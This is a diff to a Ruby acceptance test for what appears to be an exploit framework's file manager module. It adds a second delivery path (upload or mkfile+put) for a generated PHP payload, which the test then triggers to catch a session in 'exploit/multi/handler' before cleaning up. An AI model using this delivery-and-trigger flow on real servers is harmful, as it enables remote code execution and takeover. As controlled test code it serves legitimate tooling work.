@@ -176,9 +176,15 @@ module Acceptance
         generated = fm_json("FileManagerSessionControl.cached_php(framework.jobs.fetch(#{job.inspect}),#{payload.inspect})")
         bytes = Base64.strict_decode64(generated.fetch('bytes_base64'))
         expect(Digest::SHA256.hexdigest(bytes)).to eq(generated.fetch('sha256'))
-        fm_record('native-session-calibration.jsonl', generated.merge('iteration' => iteration, 'phase' => 'generated', 'owning_calls' => 0))
+        delivery = iteration.zero? ? 'upload' : 'mkfile+put'
+        fm_record('native-session-calibration.jsonl', generated.merge('iteration' => iteration, 'delivery' => delivery, 'phase' => 'generated', 'owning_calls' => 0))
         fm_wait(10) { expect(fm_listener_rows(port)).not_to be_empty }
-        name = @native.upload('native-session-upload', "module-target-file-manager-session-#{index}-#{iteration}.php", bytes)
+        name = "module-target-file-manager-session-#{index}-#{iteration}.php"
+        if delivery == 'upload'
+          @native.upload('native-session-upload', name, bytes)
+        else
+          @native.write('native-session-mkfile-put', name, bytes)
+        end
         trigger = Thread.new { @native.request('native-session-trigger', @native.path(name), timeout: 75) }
         trigger.report_on_exception = false
         identifier = fm_wait_session('exploit/multi/handler', payload)
@@ -189,7 +195,7 @@ module Acceptance
         fm_wait(10) { expect(fm_listener_rows(port)).to eq([]) }
         @native.recover([name], 'native-session')
         expect(fm_snapshot('native-session-after')).to eq(@baseline)
-        fm_record('native-session-calibration.jsonl', payload: payload, iteration: iteration, phase: 'used_and_remote_closed', owning_calls: 0)
+        fm_record('native-session-calibration.jsonl', payload: payload, iteration: iteration, delivery: delivery, phase: 'used_and_remote_closed', owning_calls: 0)
         fm_idle
       end
     ensure
